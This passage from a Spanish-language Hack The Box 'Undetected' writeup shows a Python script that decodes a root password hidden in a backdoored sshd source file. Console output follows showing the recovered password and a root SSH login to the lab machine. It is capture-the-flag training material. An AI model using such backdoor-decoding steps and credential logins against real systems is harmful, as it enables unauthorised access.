</span><span class="k">def</span> <span class="nf">readFile</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Extracting data from the file'</span><span class="p">)</span>
    <span class="n">name_file</span> <span class="o">=</span> <span class="s">"extractAndSort.sh"</span>
    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">f</span><span class="s">"chmod +x </span><span class="si">{</span><span class="n">name_file</span><span class="si">}</span><span class="s">"</span><span class="p">))</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">f</span><span class="s">"./</span><span class="si">{</span><span class="n">name_file</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">),</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Success!'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">output</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>

<span class="c1"># little-endian to big_endian
</span><span class="k">def</span> <span class="nf">littleToBig</span><span class="p">(</span><span class="n">data_litt</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Swaping endianndess'</span><span class="p">)</span>
    <span class="n">sections</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="n">data_litt</span> <span class="o">=</span> <span class="p">[</span><span class="n">data_litt</span><span class="p">[</span><span class="n">i</span> <span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="n">sections</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data_litt</span><span class="p">),</span> <span class="n">sections</span><span class="p">)]</span>
    <span class="n">data_litt</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data_litt</span> <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="s">"0x"</span><span class="p">]</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Success!'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">data_litt</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># hex to ascii
</span><span class="k">def</span> <span class="nf">hexToAscii</span><span class="p">(</span><span class="n">data_big</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Converting hexadecimal to ascii data'</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="sa">f</span><span class="s">"0x</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x96</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data_big</span><span class="p">]</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Success!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

<span class="c1"># process
</span><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
    <span class="n">data_litt</span> <span class="o">=</span> <span class="n">readFile</span><span class="p">()</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">data_big</span> <span class="o">=</span> <span class="n">littleToBig</span><span class="p">(</span><span class="n">data_litt</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">hexToAscii</span><span class="p">(</span><span class="n">data_big</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Password'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

<span class="c1"># main
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>El scripts requiere algunos archivos para su uso, los encuentras en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Undetected/decryptPassSSHDbinary">https://github.com/E1P0TR0/</a></p></div></blockquote><p>Ahora solo nos queda ejecutar el script, obtenemos la clave de <strong>root</strong>, nos logeamos por <strong>SSH</strong> y pa-dentro:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">❯ ./convertPass.py auth_password.c
[.] Extracting data from the file: Success!
[../.....] Swaping endianndess: Success!
[./......] Converting hexadecimal to ascii data: Success!
</span><span class="gp">[+] Password: @=qfe5%2^k-aq@%k@%6k6b@$</span>u#f<span class="k">*</span>b?3
<span class="go">
</span><span class="gp">❯ sshpass -p '@=qfe5%2^k-aq@%k@%6k6b@$</span>u#f<span class="k">*</span>b?3<span class="s1">' ssh root@10.10.11.146
</span><span class="go">Last login: Fri Apr 29 17:03:53 2022 from 10.10.14.117
</span><span class="gp">root@production:~#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">root@production:~#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root root 33 Apr 29 04:24 /root/root.txt
</span></pre></table></code></div></div><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/directory-fuzzing/" class="post-tag no-text-decoration" >Directory Fuzzing</a> <a href="/tags/phpunit/" class="post-tag no-text-decoration" >PHPUnit</a> <a href="/tags/cve-2017-9841/" class="post-tag no-text-decoration" >CVE-2017-9841</a> <a href="/tags/encryption/" class="post-tag no-text-decoration" >Encryption</a> <a href="/tags/backups/" class="post-tag no-text-decoration" >backups</a> <a href="/tags/brute-force/" class="post-tag no-text-decoration" >Brute Force</a> <a href="/tags/apache/" class="post-tag no-text-decoration" >Apache</a> <a href="/tags/sshd/" class="post-tag no-text-decoration" >SSHD</a> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >Reverse Engineering</a> <a href="/tags/backdoor/" class="post-tag no-text-decoration" >Backdoor</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Undetected - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBUndetected/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Undetected - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBUndetected/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBUndetected/&amp;text=Hackthebox Writeup Undetected - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask’s Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div><div class="card"> <a href="/posts/HTBShared/"><div class="card-body"> <em class="timeago small" data-ts="1660598471" > 2022-08-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Shared</h3><div class="text-muted small"><p> Overview: Database enumeration and SSH password leak by SQL Inyection Remote command execution in IPython (CVE-2022-21699) (Foothold) Redis password leak exploiting a connection binary Re...</p></div></div></a></div><div class="card"> <a href="/posts/HTBUpdown/"><div class="card-body"> <em class="timeago small" data-ts="1666557676" > 2022-10-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Updown</h3><div class="text-muted small"><p> Overwiew Access to development page by information leak in git repository Remote execution of commands by access to the upload of .phar files Remote execution of commands by the obsolete ve...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBTimelapse/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Timelapse</p></a> <a href="/posts/HTBLate/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Late</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
